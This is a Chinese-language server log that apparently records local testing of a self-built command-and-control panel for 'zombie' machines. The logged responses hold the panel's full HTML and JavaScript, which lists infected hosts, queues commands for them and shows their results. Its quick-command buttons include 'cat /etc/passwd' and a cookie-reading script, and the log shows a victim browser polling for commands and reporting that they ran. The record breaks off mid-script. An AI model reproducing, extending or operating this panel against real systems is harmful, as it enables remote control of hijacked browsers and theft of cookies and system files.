-->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:59:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:59:59] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:00:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:00:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:00:05 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:00:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:00:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:05] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:00:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:05] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:00:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:05] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:00:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:00:07 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:00:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:00:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:07] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:00:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:00:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-26 22:00:11 | INFO     | control_route.py:200 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-26 22:00:11 | INFO     | control_route.py:218 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: alert(document.cookie)
2025-06-26 22:00:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0203s) -> 回傳: <Response 124 bytes [200 OK]>
2025-06-26 22:00:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:11] "POST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 22:00:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:00:16 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"alert(document.cookie)","timestamp":"2025-06-26T14:00:14.798Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:00:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0053s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:00:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:16] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:00:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 22:00:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:00:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:27 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"alert(document.cookie)","timestamp":"2025-06-26T14:00:19.795Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:00:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0052s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:00:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:27] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:00:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 22:00:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:00:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:00:29 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"alert(document.cookie)","timestamp":"2025-06-26T14:00:27.811Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:00:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0052s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:00:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:29] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:00:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:00:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:00:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 22:00:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:00:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:06:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:06:33 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:06:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0077s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': 